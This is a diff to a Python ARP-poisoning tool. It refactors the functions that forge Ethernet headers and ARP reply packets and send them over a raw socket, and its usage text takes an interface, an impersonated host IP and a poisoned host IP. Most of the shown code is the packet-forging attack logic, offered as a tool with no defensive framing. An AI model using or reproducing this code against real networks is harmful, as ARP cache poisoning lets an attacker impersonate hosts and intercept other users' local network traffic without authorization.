@@ -2,7 +2,7 @@
 
 from uuid import getnode as get_mac
 from struct import pack
-from socket import socket, AF_PACKET, AF_INET, SOCK_RAW, SOCK_DGRAM, PACKET_BROADCAST
+from socket import socket, AF_PACKET, AF_INET, SOCK_RAW, SOCK_DGRAM
 import sys
 import inspect
 
@@ -54,14 +54,14 @@ def split_mac(mac):
 
 
 def create_arp_reply_payload(sender_ip, target_ip, sender_mac, target_mac):
-    hardware_type = 0x0001       # for ethernet
-    protocol_type = 0x0800       # for ipv4
-    hardware_address_len = 0x06  # for mac
-    protocol_address_len = 0x04  # for ipv4
-    operation = 0x0002           # for 'reply'
+    hardware_type = 0x0001
+    protocol_type = 0x0800
+    hardware_address_len = 0x06
+    protocol_address_len = 0x04
+    operation = 0x0002
     sender_hardware_address = split_mac(sender_mac)
     sender_protocol_address = split_ip(sender_ip)
-    target_hardware_address = split_mac(target_mac) # ignored for 'send'
+    target_hardware_address = split_mac(target_mac)
     target_protocol_address = split_ip(target_ip)
     
     return b''.join([
@@ -105,9 +105,12 @@ def create_eth_header(sender_mac, target_mac):
 
 
 def create_arp_packet(sender_ip, target_ip, sender_mac, target_mac):
-    return b''.join([
-                     create_eth_header(sender_mac, target_mac),
-                     create_arp_reply_payload(sender_ip, target_ip, sender_mac, target_mac)]) 
+    header = create_eth_header(sender_mac, target_mac)
+    payload = create_arp_reply_payload(sender_ip,
+                                       target_ip,
+                                       sender_mac,
+                                       target_mac)
+    return b''.join([header, payload]) 
 
 
 def send(packet, interface):
@@ -131,9 +134,8 @@ def main(interface, impersonated_host_ip, poisoned_host_ip):
 
 def print_help():
     doc = '''
-        USAGE:
-        
-        {} INTERFACE IMPERSONATED_HOST_IP POISONED_HOST_IP
+        Usage:
+          {} INTERFACE IMPERSONATED_HOST_IP POISONED_HOST_IP
     '''.format(__file__)
     print(inspect.cleandoc(doc))
 
